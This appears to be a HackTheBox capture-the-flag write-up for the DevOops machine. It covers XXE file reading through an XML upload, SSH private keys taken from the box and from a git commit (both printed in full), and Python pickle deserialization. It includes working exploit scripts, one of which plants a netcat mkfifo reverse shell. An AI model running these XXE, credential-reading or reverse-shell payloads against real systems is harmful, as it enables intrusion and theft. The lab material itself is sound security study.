---
title: "HackTheBox - DevOops"
categories: [HackTheBox, Medium]
tags: [Linux,Medium,Web,OSWE,Deserealization,XEE]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:30:00.png
---


This was a good box from HackTheBox. It's level is setted as Medium and Linux as OS. The initial exploration is trough XEE we found on the feed.py file, and then we read the id_rsa key from roosa user.

The root we get with a .git disclousure of ssh key. We see a commit that was made by mistake and it's the root key ssh.

On the source code analysis we found a pickle python serialization, and exploit it too.

The auto python for both paths are on the body of the post. Hope you enjoy and learn something from it!

# Diagram

Here is the diagram for this machine. It's a resume from it.

```mermaid
graph TD
    A[Enumeration] -->|Nmap - Gobuster| B(Port 5000)
    B --> |Web Page| C[XEE in Upload]
    C --> |LFI - id_rsa| D(SSH Reverse Shell)
    D --> |Python Script| E[Automated Reverse Shell]
    E --> |.git commit| F[SSH Key Root]
    F --> G[root]
    H[Source Code Analysis] --> |feed.py| I[Python Pickle - Deserealization]
    I --> |Auto Python Script| J[Roosa Shell]
```

# Enumeration

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 10.10.10.91
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:29:05.png)

## Port 5000

We open it on the browser and see what is being shown.

When tryied to access 10.10.10.91 on the browser.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:31:00.png)

We run gobuster to find some directory

```sh
gobuster dir -u http://10.10.10.91:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:33:43.png)

We found /upload and /feed, the second one is just a image, nothing useful. Let's focus on the first one.

### XEE File Read

Accessing /upload on the browser we found a place to upload things

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:34:19.png)7

It's interesting because shows us to upload XML file, the first thing I imagine when I see this is XEE.

It shows us a hint about what to send on the XML tags `XML elements: Author, Subject, Content`

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:40:12.png)

```xml
<payload>
  <Author>0x4rt3mis</Author>
  <Subject>XEE</Subject>
  <Content>Devoops</Content>
</payload> 
```

We send it to the server and to burp

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:40:01.png)

We see that it works

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:40:39.png)

We start looking for XEE payload and found this post from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml) and this one which [Explains](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection) XEE attack very well detailed.

So, the payload is this

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

We adapt to our cenario and read the /etc/passwd

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>

<payload>
  <Author>0x4rt3mis</Author>
  <Subject>XEE</Subject>
  <Content>&file;</Content>
</payload> 
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:45:06.png)

Since I know that there is a roosa user in this box. I can read it's ssh key

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:53:27.png)

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```

Sure, now let's connet with it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2002:54:41.png)

Now, let's automate it.

# Auto Shell Roosa

First, we will use our python skeleton to do that

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2003:10:42.png)

auto_roosa.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto XEE in DevOops to retrieve the ssh key from roosa user and auto connect

import argparse
import requests
import sys
import os

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

#Function to XEE the ROOSA ssh key
def getXEEKey(rhost):
    print("[+] Let's get the roosa ssh key !!! [+]")
    url = "http://%s:5000/upload" %rhost
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Content-Type": "multipart/form-data; boundary=---------------------------830128796004521931929284550"}
    data = "-----------------------------830128796004521931929284550\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.xml\"\r\nContent-Type: text/xml\r\n\r\n<?xml version=\"1.0\"?>\r\n<!DOCTYPE data [\r\n<!ELEMENT data (ANY)>\r\n<!ENTITY file SYSTEM \"file:///home/roosa/.ssh/id_rsa\">\r\n]>\r\n\r\n<payload>\n  <Author>0x4rt3mis</Author>\n  <Subject>XEE</Subject>\n  <Content>&file;</Content>\n</payload> \n\r\n-----------------------------830128796004521931929284550--\r\n"
    roosa_key = r.post(url, headers=headers, data=data, proxies=proxies)
    index = roosa_key.text.find("Content")
    global key
    key = roosa_key.text[index:index+1683].split(':')[1][1:]

#Function to connect ssh on the box
def connectSSH(rhost,key):
    print("[+] Done! Now Let's connect!!!! [+]")
    ssh_key = '/tmp/rsa_key'
    f = open(ssh_key, 'w'); f.write(key); f.close()
    os.system('chmod 400 /tmp/rsa_key')
    os.system('sleep 1')
    os.system('ssh -i /tmp/rsa_key roosa@%s' %rhost)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    rhost = args.target

    '''Here we call the functions'''
    # Let's get the ssh key
    getXEEKey(rhost)
    # Let's connect
    connectSSH(rhost,key)

if __name__ == '__main__':
    main()
```

We did one to retrieve any file from the server too

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:14:28.png)

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto XEE in DevOops to retrieve files

import argparse
import requests
import sys
import os
import re

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

#Function to XEE files
def getXEEKey(rhost,file):
    print("[+] Let's get the file for you !!! [+]")
    url = "http://%s:5000/upload" %rhost
    xml_xee = f'''<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "file:///%s">
]>

<payload>
  <Author>&file;</Author>
  <Subject>XEE</Subject>
  <Content>0x4rt3mis</Content>
</payload> ''' %file

    files = {'file': ('xxe.xml', xml_xee, 'text/xml')}
    roosa_key = r.post(url, files=files, proxies=proxies)
    if roosa_key.status_code == 200:
        match = re.search(r'Author:.*Subject', roosa_key.text, re.DOTALL).group(0)
        print(match.removesuffix('\n Subject').removeprefix('Author: '))
    else:
        print("[+] Sorry, file does not exist. Try with another file !! [+]")

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-f', '--file', help='File to be read', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    file = args.file

    '''Here we call the functions'''
    # Let's get the ssh key
    getXEEKey(rhost,file)

if __name__ == '__main__':
    main()
```

So, let's get root on the box now.

# Roosa --> Root

We see some indicatives that maybe we should have a .git directory on the box

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:21:48.png)

So, we search for it

```sh
find / -type d -name '.git' 2>/dev/null
```

And found it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:22:28.png)

```sh
git log --name-only --oneline
```

We see the git log from the commits and found one suspicious

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:24:59.png)

So we should look at the differences betwen the two commits

```sh
git diff 1422e5a d387abf
```

And it's a ssh key

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:25:17.png)

So we copy it and try to log as root

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
```

And we get root

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:26:39.png)

# Source Code Analysis

To better debug the app we stop the python aplication and add the root ssh key on the authorized_keys, then start a rsync to copy the content of /home/roosa/ folder.

```sh
rsync -azP -i root@10.10.10.91:/home/roosa/* .
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:31:42.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:32:16.png)

Now we can start looking for vulnerabilities on the code

One thing that imediatelly caught my eye was the `cPickle` being imported in feed.py

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:34:42.png)

Looking on the feed.py we see that it's being used on the `NEWPOST` function

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:35:42.png)

So, let's use it to try to deserelialize python pickles

So we try to create a payload to ping us back

```py
#!/usr/bin/python

import cPickle
import sys
import os
import base64
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-ip','--ip', help='IP to ping', required=True)
args = parser.parse_args()

def payload():
        global COMMAND
        COMMAND = "ping -c5 %s" %(args.ip)
        class PickleRce(object):
                def __reduce__(self):
                        return (os.system,(COMMAND,))
        global comando
        comando = base64.b64encode(cPickle.dumps(PickleRce()))
        comando = str(comando)

payload()
print(comando)
```

We generate the payload

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:38:27.png)

And now we try to send to the server to see if it reach us. In this case I'll use BurpSuite to better debug the request

And we see that it works

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2006:40:55.png)

We will get a reverse shell now and automate it

And here it is

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2007:06:33.png)

pick_auto.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Exploit to auto shell in python pickles from DevOops - HackTheBox

import argparse
import requests
import sys
import pickle
import os
import base64
import socket, telnetlib
from threading import Thread

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()
    
# Create the Payload in base64
def payload(lhost,lport):
    global COMMAND
    COMMAND = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" %(lhost,lport)
    class PAYLOAD():
        def __reduce__(self):
            return os.system, ("{}".format(COMMAND),)
    global payload
    payload = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")
    payload = str(payload)

# Trigger the reverse shell
def triggerReverse(rhost,payload):
    url = "http://%s:5000/newpost" %rhost
    data = payload
    r.post(url, data=data, proxies=proxies)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-i', '--ip', help='IP to receive the shell back', required=True)
    parser.add_argument('-p', '--port', help='Port to receive the shell back', required=True)
    args = parser.parse_args()

    rhost = args.target
    lhost = args.ip
    lport = args.port

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Create the payload to send
    payload(lhost,lport)
    # Trigger the reverse
    triggerReverse(rhost,payload)

if __name__ == '__main__':
    main()
```

The same way we can see on `feed.py` the UPLOAD function, which we explored to get XEE working

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2007:47:40.png)

```py
@app.route('/upload', methods=['GET', 'POST'])                                                           
def upload_file():                                  
  if request.method == 'POST':                      
     # check if the post request has the file part
     if 'file' not in request.files:                
        #flash('No file part')                                                                           
        return redirect(request.url)                
     file = request.files['file']
     # if user does not select file, browser also
     # submit a empty part without filename
     if file.filename == '':
        #flash('No selected file')
        return redirect(request.url)
     if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file.save(os.path.join(Config.UPLOAD_FOLDER, filename))
        return process_xml(filename, os.path.abspath(Config.UPLOAD_FOLDER))
        # return redirect(url_for('uploaded_file',filename=filename))
  return template('upload.html')
```

We see that it parses the filename to see if it's allowed or not

On the same file we see it, the filename and EXTENSION, to see if it's allowed

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2007:49:22.png)

```py
ALLOWED_EXTENSIONS = set(['xml'])       
app = Flask(__name__)                 
app.config.from_object(Config)                                                                           
app.debug=True                                                                                           
print(app.config)                                                                                        
                                                                                                         
#app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
                                                    
def allowed_file(filename):                       
  return '.' in filename and \      
    filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS     
```

Then we see that it goes trough the xml_parser function

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2007:50:34.png)

```py
def process_xml(filename, path):
  parser = xml.sax.make_parser()
  object = {}
  handler = FeedParse(object)
  parser.setContentHandler(handler)
  parser.parse(open(filename))
#  print object
  return " PROCESSED BLOGPOST: \r\n " + \
         " Author: " + object["Author"] + "\r\n" + \
         " Subject: " + object["Subject"] + "\r\n" + \
         " Content: " + object["Content"] + "\r\n" + \
         " URL for later reference: " + url_for('uploaded_file',filename=filename) + "\r\n" + \
         " File path: " + path
```

We see that the three options of the xml tag are vulnerable to XEE.

We see [Here](https://docs.guardrails.io/docs/en/vulnerabilities/java/insecure_processing_of_data) the explanation of this Vuln

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-09-19-HackTheBox-DevOops/2021-09-19-HackTheBox-DevOops%2007:54:01.png)